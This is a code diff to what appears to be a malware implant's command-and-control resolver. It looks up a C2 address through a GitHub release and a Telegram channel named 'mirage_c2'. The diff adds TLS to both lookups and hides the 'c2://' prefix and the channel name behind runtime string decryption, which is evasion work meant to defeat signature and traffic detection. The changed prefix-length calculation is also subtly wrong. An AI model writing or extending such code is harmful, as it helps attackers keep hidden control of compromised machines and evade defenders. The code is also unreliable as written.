@@ -1,5 +1,6 @@
 #include "proxy.h"
 #include "ws2.h"
+#include "schannel.h"
 
 #include <stdlib.h>
 #include <string.h>
@@ -54,7 +55,7 @@ static int parse_c2_address(const char *c2_str, size_t len, proxy_result_t *out)
 int proxy_parse_c2(const char *body, size_t body_len, proxy_result_t *out) {
     if (!body || body_len == 0 || !out) return 0;
 
-    const char prefix[] = "c2://";
+    char prefix[8]; enc_decrypt(enc_c2_prefix, ENC_C2_PREFIX_LEN, prefix);
     const size_t prefix_len = sizeof(prefix) - 1;
 
     /* scan for prefix */
@@ -100,33 +101,39 @@ static int resolve_github(proxy_result_t *out) {
     int n = snprintf(path, sizeof(path), "/repos/%s/%s/releases/latest", user, repo);
     if (n <= 0 || (size_t)n >= sizeof(path)) return 0;
 
-    /* Connect to api.github.com:443 (plaintext here; TLS layer wraps externally) */
+    /* Connect to api.github.com:443 */
     ws2_socket_t sk;
     ws2_result_t r = ws2_connect(&sk, github_host, 443);
     if (r != WS2_OK) return 0;
+
+    /* Wrap connection in TLS */
+    tls_context_t tls_ctx;
+    tls_result_t tls_res = tls_connect(&tls_ctx, sk.handle, github_host);
+    if (tls_res != TLS_OK) { ws2_close(sk.handle); return 0; }
 
     /* build minimal HTTP GET */
     char request[512];
     int rlen = snprintf(request, sizeof(request),
         "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
         path, github_host);
-    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close(sk.handle); return 0; }
+    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }
 
     size_t sent = 0;
-    r = ws2_send(sk.handle, (const uint8_t *)request, (size_t)rlen, &sent);
-    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
+    tls_res = tls_send(&tls_ctx, (const uint8_t *)request, (size_t)rlen, &sent);
+    if (tls_res != TLS_OK) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }
 
     /* read response */
     char resp_buf[8192];
     size_t total = 0;
     size_t chunk;
     while (total < sizeof(resp_buf) - 1) {
-        r = ws2_recv(sk.handle, (uint8_t *)resp_buf + total,
+        tls_res = tls_recv(&tls_ctx, (uint8_t *)resp_buf + total,
                       sizeof(resp_buf) - 1 - total, &chunk);
-        if (r != WS2_OK || chunk == 0) break;
+        if (tls_res != TLS_OK || chunk == 0) break;
         total += chunk;
     }
     resp_buf[total] = '\0';
+    tls_disconnect(&tls_ctx);
     ws2_close(sk.handle);
 
     if (total == 0) return 0;
@@ -149,7 +156,7 @@ static int resolve_telegram(proxy_result_t *out) {
     char tg_host[16];
     enc_decrypt(enc_telegram_host, ENC_TELEGRAM_HOST_LEN, tg_host);
 
-    const char *channel_name = "mirage_c2";
+    char channel_name[32]; enc_decrypt(enc_mirage_c2_channel, ENC_MIRAGE_C2_CHANNEL_LEN, channel_name);
     char path[128];
     int n = snprintf(path, sizeof(path), "/s/%s", channel_name);
     if (n <= 0 || (size_t)n >= sizeof(path)) return 0;
@@ -158,26 +165,32 @@ static int resolve_telegram(proxy_result_t *out) {
     ws2_result_t r = ws2_connect(&sk, tg_host, 443);
     if (r != WS2_OK) return 0;
 
+    /* Wrap connection in TLS */
+    tls_context_t tls_ctx;
+    tls_result_t tls_res = tls_connect(&tls_ctx, sk.handle, tg_host);
+    if (tls_res != TLS_OK) { ws2_close(sk.handle); return 0; }
+
     char request[512];
     int rlen = snprintf(request, sizeof(request),
         "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
         path, tg_host);
-    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { ws2_close(sk.handle); return 0; }
+    if (rlen <= 0 || (size_t)rlen >= sizeof(request)) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }
 
     size_t sent = 0;
-    r = ws2_send(sk.handle, (const uint8_t *)request, (size_t)rlen, &sent);
-    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
+    tls_res = tls_send(&tls_ctx, (const uint8_t *)request, (size_t)rlen, &sent);
+    if (tls_res != TLS_OK) { tls_disconnect(&tls_ctx); ws2_close(sk.handle); return 0; }
 
     char resp_buf[8192];
     size_t total = 0;
     size_t chunk;
     while (total < sizeof(resp_buf) - 1) {
-        r = ws2_recv(sk.handle, (uint8_t *)resp_buf + total,
+        tls_res = tls_recv(&tls_ctx, (uint8_t *)resp_buf + total,
                       sizeof(resp_buf) - 1 - total, &chunk);
-        if (r != WS2_OK || chunk == 0) break;
+        if (tls_res != TLS_OK || chunk == 0) break;
         total += chunk;
     }
     resp_buf[total] = '\0';
+    tls_disconnect(&tls_ctx);
     ws2_close(sk.handle);
 
     if (total == 0) return 0;
